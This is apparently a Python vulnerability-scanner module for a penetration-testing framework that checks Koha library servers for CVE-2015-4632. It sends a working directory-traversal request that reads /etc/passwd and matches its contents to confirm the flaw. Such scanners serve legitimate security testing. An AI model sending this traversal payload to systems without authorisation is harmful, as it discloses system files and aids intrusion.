#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Koha 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Koha 3.20.1 - Directory Traversal Detection',
        'description': 'Koha 3.14.x before 3.14.16, 3.16.x before 3.16.12, 3.18.x before 3.18.08, and 3.20.x before 3.20.1 allow remote attackers to read arbitrary files via a ..%2f (dot dot encoded slash) in the template_path parameter to (1) svc/virtualshelves/search or (2) svc/members/search.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'lfi', 'edb', 'koha', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/37388',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-4632',
            'https://www.sba-research.org/2015/06/24/researchers-of-sba-research-found-several-critical-security-vulnerabilities-in-the-koha-library-software-via-combinatorial-testing/',
            'https://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14408',
            'https://koha-community.org/koha-3-14-16-released/',
        ],
        'cve': 'CVE-2015-4632',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/koha/svc/virtualshelves/search?template_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Koha 3.20.1 - Directory Traversal detected",
                path='/cgi-bin/koha/svc/virtualshelves/search?template_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
            )
            return True
        return False

